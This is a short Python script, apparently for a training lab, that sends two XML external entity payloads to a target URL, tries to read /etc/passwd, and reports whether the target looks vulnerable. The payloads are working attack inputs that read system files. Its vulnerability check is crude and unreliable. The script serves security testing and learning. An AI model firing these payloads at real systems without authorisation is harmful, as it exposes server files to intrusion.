import requests
from termcolor import colored
import logging
from urllib.parse import quote_plus

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Define XXE payloads
XXE_PAYLOADS = [
    '''<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>''',

    '''<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
    ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>'''
]

def detect_xxe(url, session_cookie=None):
    logging.info("Starting XXE detection...")
    results = []
    headers = {'Content-Type': 'application/xml'}

    if session_cookie:
        headers['Cookie'] = session_cookie

    for payload in XXE_PAYLOADS:
        try:
            encoded_payload = quote_plus(payload)
            full_url = f"{url}?xml={encoded_payload}"
            logging.info(f"Sending GET request to URL: {full_url}")
            response = requests.get(full_url, headers=headers, timeout=30)

            result = {
                'payload': payload,
                'status_code': response.status_code,
                'response_content': response.text[:500],  # Truncate for brevity
                'vulnerable': "xxe" in response.text.lower() or response.status_code == 500
            }
            logging.debug(f"Response Status Code: {response.status_code}")
            logging.debug(f"Response Content: {response.text[:500]}")
            results.append(result)

        except requests.RequestException as e:
            logging.error(f"Request failed for payload: {payload}\nError: {e}")
            results.append({
                'payload': payload,
                'error': str(e)
            })

    # Format the results for display
    for result in results:
        if 'error' in result:
            print(f"Request failed for payload:\n{result['payload']}\nError: {result['error']}")
        else:
            print(f"Payload sent:\n{result['payload']}")
            print(f"Response Status Code: {result['status_code']}")
            print(f"Response Content: {result['response_content']}")
            print(colored(f"Vulnerable: {'Yes' if result['vulnerable'] else 'No'}\n", 'red' if result['vulnerable'] else 'green'))

def main():
    import argparse
    parser = argparse.ArgumentParser(description="XXE Detection Tool")
    parser.add_argument("lab_url", help="The lab URL to test for XXE vulnerabilities")
    parser.add_argument("--session-cookie", help="Session cookie for authentication (if needed)")
    args = parser.parse_args()

    detect_xxe(args.lab_url, args.session_cookie)

if __name__ == '__main__':
    main()
